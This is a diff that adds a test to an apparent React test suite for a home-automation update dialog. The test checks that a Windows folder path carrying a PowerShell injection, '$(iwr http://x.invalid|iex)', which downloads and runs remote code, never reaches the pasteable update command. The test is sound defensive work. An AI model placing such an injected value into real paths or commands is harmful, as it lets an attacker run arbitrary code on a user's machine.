@@ -343,6 +343,19 @@ describe("no text is rendered as HTML", () => {
     }
   });
 
+  it("builds no pasteable command from a folder PowerShell would expand", () => {
+    const evilDir = "C:\\Users\\$(iwr http://x.invalid|iex)\\HomeMesh";
+    const hub = hubNode({ build: build({ os: "windows", source_dir: evilDir, logs_dir: "C:\\logs" }), update_check: stored(result()) });
+    render(<UpdateDialog node={hub} result={result()} hub={hub} onClose={vi.fn()} onDone={vi.fn()} />);
+    expect(cmds(screen.getByRole("dialog"))).toEqual([
+      "homemesh update status", "cd <HomeMesh source folder>; powershell -ExecutionPolicy Bypass -File deploy\\windows\\install.ps1 -Upgrade"]);
+    const p = panel(hubNode({ build: build({ os: "windows", source_dir: evilDir, can_update: false, source: "unknown", cannot_update_reason: "no checkout" }) }));
+    expect(cmds(p.box)).toEqual([WINDOWS_PULL]);
+    const failed = panel(hubNode({ build: build({ os: "windows", source_dir: evilDir }), update: row({ state: "failed", finished_at: iso(MIN),
+      error: { code: "update_rollback_failed", message: "HomeMesh is stopped on hub-pc.", hint: "Run the installer." } }) }));
+    expect(cmds(failed.box)).toEqual(["cd <HomeMesh source folder>; powershell -ExecutionPolicy Bypass -File deploy\\windows\\install.ps1 -Upgrade"]);
+  });
+
   it("in the dialog's commit subjects", () => {
     const r = result({ commits: [{ sha: SHA_B, subject: evil, date: null }], behind: 1 });
     const { container } = render(<UpdateDialog node={node({ update_check: stored(r) })} result={r} hub={null} onClose={vi.fn()} onDone={vi.fn()} />);
